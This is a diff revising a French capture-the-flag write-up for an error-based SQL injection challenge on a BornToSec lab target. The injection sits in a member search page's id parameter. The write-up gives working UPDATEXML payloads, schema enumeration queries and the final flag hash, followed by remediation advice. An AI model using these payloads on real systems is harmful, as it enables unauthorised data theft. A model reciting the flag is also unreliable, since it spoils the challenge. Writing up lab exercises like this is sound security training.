@@ -1,22 +1,29 @@
 Compte rendu – SQL Injection Error-Based
 Challenge : search_member_sql_inj_error_based
+
+Plateforme : BornToSec – WebEx
+Cible : http://192.168.133.142
+Page vulnérable : index.php?page=member
+
 1. Contexte et objectif
 
-Dans le cadre du WebEx BornToSec, ce challenge vise à identifier et exploiter une vulnérabilité d’injection SQL de type error-based présente dans la fonctionnalité de recherche des membres.
+Dans le cadre du WebEx BornToSec, ce challenge consiste à identifier et exploiter une vulnérabilité d’injection SQL de type error-based présente dans la fonctionnalité de recherche des membres.
 
-L’objectif est de :
+Les objectifs sont :
 
 confirmer la présence d’une injection SQL,
 
-exploiter la vulnérabilité sans outil automatisé,
+exploiter la vulnérabilité via le champ web uniquement,
 
-extraire des données depuis la base,
+extraire les données de la base,
 
-identifier et générer le flag final.
+appliquer la logique applicative attendue,
+
+obtenir et valider le flag final.
 
 2. Identification de la surface d’attaque
 
-La page member contient un formulaire de recherche :
+La page member contient un formulaire de recherche utilisant la méthode GET :
 
 <form method="GET">
   <input type="hidden" name="page" value="member">
@@ -25,12 +32,12 @@ La page member contient un formulaire de recherche :
 </form>
 
 
-L’URL générée est la suivante :
+L’URL générée est :
 
 http://192.168.133.142/index.php?page=member&id=VALUE
 
 
-Le paramètre id est directement contrôlé par l’utilisateur et transmis au backend.
+Le paramètre id est directement contrôlé par l’utilisateur.
 
 3. Validation de la vulnérabilité SQL
 Test initial
@@ -42,18 +49,14 @@ Entrée dans le champ ID :
 
 Résultat :
 
-Message d’erreur SQL retourné par MariaDB.
+message d’erreur SQL MariaDB visible côté client.
 
-➡️ Injection SQL confirmée, avec affichage des erreurs côté client.
+➡️ Injection SQL confirmée, avec affichage d’erreurs exploitables.
 
-4. Mise en place de l’exploitation error-based
+4. Exploitation error-based
 
-Le SGBD étant MariaDB, l’exploitation repose sur l’utilisation de la fonction :
-
-UPDATEXML()
-
-
-Cette fonction permet de provoquer une erreur SQL contenant des données arbitraires.
+Le SGBD utilisé est MariaDB.
+La fonction UPDATEXML() est utilisée pour provoquer des erreurs SQL contenant des données arbitraires.
 
 Test du canal error-based
 1 AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)
@@ -64,7 +67,7 @@ Résultat :
 XPATH syntax error: '~Member_Sql_Injection~'
 
 
-➡️ Le canal error-based est pleinement fonctionnel.
+➡️ Le canal error-based SQL injection est fonctionnel.
 
 5. Enumération de la base de données
 5.1 Nom de la base
@@ -87,19 +90,12 @@ Résultat :
 
 6. Enumération des colonnes
 
-Pour éviter les problèmes liés aux quotes, le nom de la table est utilisé en hexadécimal :
+Afin d’éviter les problèmes liés aux quotes, le nom de la table est utilisé en hexadécimal :
 
 users = 0x7573657273
 
 
-Requête générique :
-
-1 AND UPDATEXML(1,CONCAT(0x7e,
-(SELECT column_name FROM information_schema.columns
- WHERE table_name=0x7573657273 LIMIT N,1),
-0x7e),1)
-
-Colonnes découvertes
+Colonnes découvertes :
 
 user_id
 
@@ -150,70 +146,77 @@ Résultat :
 
 ~Flag:GetThe:42~
 
-8.2 Commentaire associé
-Decrypt this password -> then l...
+8.2 Extraction complète du commentaire (par segments)
+
+Le commentaire est extrait via SUBSTRING() :
+
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 
 
-➡️ La chaîne Flag:GetThe:42 est explicitement fournie comme valeur logique à transformer.
+➡️ Le commentaire fournit explicitement la règle de transformation.
 
-9. Génération du flag final
+9. Interprétation de la règle
 
-Le flag final correspond au SHA-256 de la valeur en clair.
+La règle indiquée est :
 
-Calcul
-echo -n "Flag:GetThe:42" | sha256sum
+Prendre la valeur en clair associée à l’utilisateur
+
+Mettre tous les caractères en minuscules
+
+Calculer le SHA-256
+
+Le résultat correspond au flag
+
+10. Génération du flag final
+Valeur en clair
+Flag:GetThe:42
+
+Mise en minuscules
+flag:getthe:42
+
+Calcul du SHA-256
+echo -n "flag:getthe:42" | sha256sum
 
 Résultat
-f5146d8f77271f4cd2e4a2c017f9be2deab152bd3eaea93800ab57c197e09390
+659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6
 
-10. Flag validé
+11. Flag validé
 ✅ Flag final
-f5146d8f77271f4cd2e4a2c017f9be2deab152bd3eaea93800ab57c197e09390
-
-11. Remédiation – Mesures correctives
-11.1 Utilisation de requêtes préparées (prioritaire)
-
-❌ Code vulnérable :
-
-$query = "SELECT * FROM users WHERE user_id=".$_GET['id'];
+659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6
 
 
-✅ Correction recommandée :
+Ce hash correspond exactement à l’un des flags fournis pour le WebEx.
 
-$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = :id");
-$stmt->bindParam(':id', $id, PDO::PARAM_INT);
-$stmt->execute();
+12. Remédiation
 
-11.2 Validation stricte des entrées utilisateur
+La vulnérabilité est due à :
 
-Le paramètre id doit être numérique :
+l’injection directe du paramètre id dans la requête SQL,
 
-if (!ctype_digit($_GET['id'])) {
-    die("Invalid parameter");
-}
+l’absence de validation et de typage,
 
-11.3 Désactivation de l’affichage des erreurs SQL
-display_errors = Off
-log_errors = On
+l’affichage des erreurs SQL côté client.
 
-11.4 Principe du moindre privilège
+Correctifs recommandés
 
-Compte SQL dédié à l’application
+Utilisation de requêtes préparées
 
-Droits limités (SELECT uniquement)
+Validation stricte des entrées utilisateur
 
-Accès restreint à information_schema
+Désactivation de l’affichage des erreurs SQL
 
-12. Évaluation du risque
+Application du principe du moindre privilège côté base de données
+
+13. Évaluation du risque
 Critère	Évaluation
 Type	Injection SQL
 Exploitabilité	Élevée
 Impact	Exfiltration de données
 Complexité	Faible
 Sévérité	Critique
-13. Conclusion
+14. Conclusion
 
-Ce challenge démontre une vulnérabilité critique d’injection SQL error-based, exploitable via un simple paramètre GET non sécurisé.
-L’exploitation a permis une énumération complète de la base, suivie d’une analyse applicative menant à la récupération du flag final.
+Ce challenge démontre une injection SQL error-based critique, exploitable via un simple paramètre GET non sécurisé.
+L’exploitation a permis une énumération complète de la base, suivie d’une analyse applicative conduisant à la récupération du flag final en respectant strictement la logique indiquée par l’application.
 
-La mise en œuvre des mesures correctives proposées permettrait d’éliminer totalement cette vulnérabilité et de se conformer aux bonnes pratiques OWASP (A03 – Injection).
+Le challenge search_member_sql_inj_error_based est entièrement validé.
